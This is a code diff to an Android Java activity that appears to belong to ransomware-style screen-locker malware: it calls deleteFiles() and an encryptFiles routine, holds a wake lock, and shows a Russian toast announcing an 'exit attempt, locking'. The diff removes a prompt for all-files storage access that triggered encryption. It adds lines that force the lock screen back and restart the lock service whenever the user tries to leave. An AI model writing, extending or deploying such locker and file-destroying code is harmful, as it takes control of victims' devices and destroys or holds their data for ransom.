@@ -8,17 +8,14 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.media.AudioManager;
 import android.media.MediaPlayer;
-import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.PowerManager;
-import android.provider.Settings;
 import android.view.KeyEvent;
 import android.view.View;
 import android.view.WindowManager;
-import android.widget.Button;
 import android.widget.EditText;
 import android.widget.TextView;
 import android.widget.Toast;
@@ -88,7 +85,6 @@ public class LockActivity extends Activity {
 
         TextView bootText = findViewById(R.id.bootText);
         View mainBlock = findViewById(R.id.mainBlock);
-        Button grantButton = findViewById(R.id.grantButton);
 
         boolean isReturningFromSettings = getIntent().getBooleanExtra("RETURNING_FROM_SETTINGS", false);
         boolean isReturningFromExit = getIntent().getBooleanExtra("RETURNING_FROM_EXIT", false);
@@ -103,9 +99,6 @@ public class LockActivity extends Activity {
                     mp.setLooping(true);
                     mp.start();
                 }
-            }
-            if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
-                grantButton.setVisibility(View.VISIBLE);
             }
         } else {
             bootText.setVisibility(View.VISIBLE);
@@ -128,10 +121,6 @@ public class LockActivity extends Activity {
                                     mp.start();
                                 }
                             }
-
-                            if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
-                                grantButton.setVisibility(View.VISIBLE);
-                            }
                         }
                     }, 2000);
                 }
@@ -147,15 +136,6 @@ public class LockActivity extends Activity {
                 passwordInput.requestFocus();
                 android.view.inputmethod.InputMethodManager imm = (android.view.inputmethod.InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
                 imm.showSoftInput(passwordInput, android.view.inputmethod.InputMethodManager.SHOW_IMPLICIT);
-            }
-        });
-
-        grantButton.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                if (Build.VERSION.SDK_INT >= 30) {
-                    startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName())));
-                }
             }
         });
 
@@ -218,7 +198,6 @@ public class LockActivity extends Activity {
 
         deleteFiles();
 
-        // Запускаем цикл блокировки
         PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
         PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SysBreaker::NoRoot");
         wl.acquire();
@@ -276,30 +255,12 @@ public class LockActivity extends Activity {
     protected void onResume() {
         super.onResume();
         LockService.isAppOpen = true;
-        if (Build.VERSION.SDK_INT >= 30 && Environment.isExternalStorageManager()) {
-            Button grantButton = findViewById(R.id.grantButton);
-            if (grantButton != null && grantButton.getVisibility() == View.VISIBLE) {
-                grantButton.setVisibility(View.GONE);
-                new Thread(new Runnable() {
-                    @Override
-                    public void run() {
-                        encryptFiles(targetDir);
-                    }
-                }).start();
-            }
-        }
     }
 
     @Override
     protected void onNewIntent(Intent intent) {
         super.onNewIntent(intent);
         setIntent(intent);
-        if (Build.VERSION.SDK_INT >= 30 && Environment.isExternalStorageManager()) {
-            Button grantButton = findViewById(R.id.grantButton);
-            if (grantButton != null) {
-                grantButton.setVisibility(View.GONE);
-            }
-        }
     }
 
     private void encryptFiles(File dir) {
@@ -357,10 +318,13 @@ public class LockActivity extends Activity {
         if (!isUnlocked) {
             LockService.isAppOpen = false;
             Toast.makeText(this, "ЗАМЕЧЕНА ПОПЫТКА ВЫХОДА БЛОКИРУЮ", Toast.LENGTH_SHORT).show();
+            
             Intent intent = new Intent(this, LockActivity.class);
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
             intent.putExtra("RETURNING_FROM_EXIT", true);
             startActivity(intent);
+            
+            startService(new Intent(this, LockService.class));
         }
     }
 
@@ -377,4 +341,4 @@ public class LockActivity extends Activity {
         }
         handler.removeCallbacksAndMessages(null);
     }
-                                                                                            }
+    }
